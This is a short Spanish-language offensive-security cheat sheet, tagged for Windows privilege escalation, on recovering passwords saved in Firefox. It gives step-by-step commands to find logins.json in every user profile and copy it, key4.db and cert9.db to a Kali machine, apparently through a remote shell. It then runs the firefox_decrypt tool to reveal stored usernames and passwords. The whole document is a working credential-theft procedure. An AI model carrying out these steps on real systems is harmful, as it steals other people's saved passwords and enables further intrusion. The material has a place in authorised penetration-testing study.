# Firefox

Tags: #PrivEsc #Firefox #Windows 

Mozilla Firefox es un navegador web gratuito y de código abierto desarrollado por la Fundación Mozilla que sirve para acceder, ver y navegar por páginas de internet.

Saber si esta instalado:  ``C:\Program Files\Mozilla Firefox``

Lo único que necesitas es:
- Que Firefox esté instalado 
- Que el usuario haya guardado credenciales alguna vez 
- Acceso de lectura al perfil del usuario 

## Firefox Decrypt 
```powershell 
Paso 1:
# Buscar la ruta del archivo 'logins.json' 
❯ dir "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json" 

Resultado:
	C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr
		logins.json   # Muestra que en esa ruta se encuentra el archivo 
```

```powershell 
Paso 2:
# Descargar los siguientes 3 archivos a Kali desde Windows utilizando la ruta anterior
❯ download "C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr\logins.json"
❯ download "C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr\key4.db"
❯ download "C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr\cert9.db"
```

```bash 
Paso 3:
# Descargar la tool en Kali 
❯ git clone https://github.com/unode/firefox_decrypt && cd firefox_decrypt

Paso 4:
# Ejecutar la herramienta y obtener el 'username' y 'password'
❯ python3 firefox_decrypt.py .

NOTA:
	- Los archivos 'logins.json, key4.db, cert9.db' se deben de encontrar dentro del dir 'firefox_decrypt' antes de ejecutar el comando para que funcione y se pueda obtener la password 
```

